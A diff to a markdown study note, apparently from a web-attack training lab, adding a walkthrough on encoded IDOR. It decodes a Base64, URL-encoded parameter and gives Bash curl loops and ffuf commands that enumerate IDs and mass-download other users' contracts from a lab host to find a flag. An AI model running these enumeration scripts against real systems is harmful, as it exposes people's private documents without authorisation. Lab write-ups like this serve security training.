@@ -8,12 +8,15 @@ This document covers common techniques for identifying and exploiting **web vuln
 
 - [Web Attacks](#web-attacks)
     - [Overview](#overview)
+    
     - [HTTP Verb Tampering](#http-verb-tampering)
         - [Bypassing Basic Authentication](#bypassing-basic-authentication)
         - [Bypassing Security Filters](#bypassing-security-filters)
+    
     - [Insecure Direct Object References (IDOR)](#insecure-direct-object-references-idor)
         - [Identifying IDORs](#identifying-idors)
         - [IDOR Enumeration](#idor-enumeration)
+        - [Encoded Object References](#encoded-object-references)
 
 ---
 
@@ -404,7 +407,7 @@ This confirms the presence of an IDOR vulnerability caused by **missing server-s
 Enumeration of accessible user IDs can be easily automated using `ffuf`:
 
 ```bash
-seq 1 10 > ids.txt
+seq 1 20 > ids.txt
 ```
 
 ```bash
@@ -413,7 +416,7 @@ ffuf -w ids.txt:FUZZ -u http://94.237.57.211:47065/documents.php?uid=FUZZ
 
 A more effective approach is to automate both enumeration and file retrieval using a simple `Bash` script:
 
-`GET`-based version IDOR enumeration script:
+`GET`-based IDOR enumeration script:
 
 ```bash
 #!/bin/bash
@@ -444,5 +447,89 @@ done
 ```
 
 When executed, this script iterates through user IDs 1–20, extracts document links, and downloads all available files. This results in **mass disclosure of sensitive employee documents**, fully exploiting the IDOR vulnerability.
+
+---
+
+### Encoded Object References
+
+In some applications, object references are encoded or hashed before being sent to the client. While this may make IDOR enumeration less obvious, it does not prevent exploitation if proper access control is not enforced on the back end.
+
+When clicking on a file such as `Employment_contract.pdf`, a download process is triggered:
+
+![Filtered output](images/encoded-idor.png)
+
+Intercepting the request reveals that the object reference is encoded:
+
+```
+http://94.237.121.92:56620/download.php?contract=MQ%3D%3D
+```
+
+Using a `download.php` script to serve files is a common practice, as it avoids exposing direct file paths. In this case, the object reference appears to be URL-encoded:
+
+```bash
+# URL encoded
+MQ%3D%3D
+
+# URL decoded
+MQ==
+```
+
+The decoded value resembles a `Base64`-encoded string. This indicates that the object reference has been encoded twice: first using `Base64`, and then URL-encoded for safe transmission in the query string.
+
+```bash
+# Base64 encoded
+MQ==
+
+# Base64 decoded
+1
+```
+
+After fully decoding the parameter, we recover the original object identifier:
+
+```
+http://94.237.121.92:56620/download.php?contract=1
+```
+
+If the application is vulnerable to IDOR, we can access other users’ contracts by encoding different object identifiers using the same encoding chain (Base64 &rarr; URL encoding).
+
+To automate enumeration and download all employee contracts, we can write a simple Bash script.
+
+`GET`-based version
+```bash
+#!/bin/bash
+
+for i in {1..20}; do
+    id=$(echo -n "$i" | base64)
+    curl -sOJ --get --data-urlencode "contract=$id" http://94.237.121.92:56620/download.php
+done
+```
+
+`POST`-based version
+```bash
+#!/bin/bash
+for i in {1..20}; do
+    for id in $(echo -n $i | base64); do
+        curl -sOJ --data-urlencode "contract=$id" http://94.237.121.92:56620/download.php
+    done
+done
+```
+
+Both scripts enumerate object identifiers, encode them appropriately, and download all accessible contracts, confirming the presence of an IDOR vulnerability.
+
+Running the script results in multiple downloaded contract files:
+
+![Filtered output](images/encoded-idor3.png)
+
+The downloaded filenames are obfuscated using `md5` hashing. Since we do not know which file contains the target data, we can inspect the contents of each file.
+
+One simple approach is to concatenate all files and review the output:
+
+```bash
+ls | xargs cat
+```
+
+Most files are empty; however, one file contains the flag:
+
+![Filtered output](images/encoded-idor4.png)
 
 ---
